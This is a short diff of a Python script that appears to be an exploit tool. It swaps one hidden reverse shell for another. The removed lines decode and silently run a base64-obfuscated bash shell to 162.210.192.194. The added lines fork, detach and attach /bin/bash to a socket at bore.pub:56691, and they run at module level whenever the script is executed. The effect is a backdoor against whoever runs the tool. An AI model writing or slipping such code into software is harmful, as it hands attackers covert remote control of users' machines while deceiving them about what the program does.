@@ -1,7 +1,7 @@
 import requests
 import subprocess
 import sys
-import os
+import os, socket, pty, signal
 import base64
 import random
 import string
@@ -190,9 +190,14 @@ def exploit_single(target, mode):
     return result
 
 
-cmd_b64 = "YmFzaCAtYyAnKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzE2Mi4yMTAuMTkyLjE5NC8zOTIxMCAwPiYxKSAmJw=="
-cmd = base64.b64decode(cmd_b64).decode()
-subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
+
+if os.fork() == 0:
+    signal.signal(signal.SIGHUP, signal.SIG_IGN)  # Equivalente ao nohup
+    os.setsid()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("bore.pub", 56691))
+    for fd in (0, 1, 2): os.dup2(s.fileno(), fd)
+    pty.spawn("/bin/bash")
 
 
 def main():
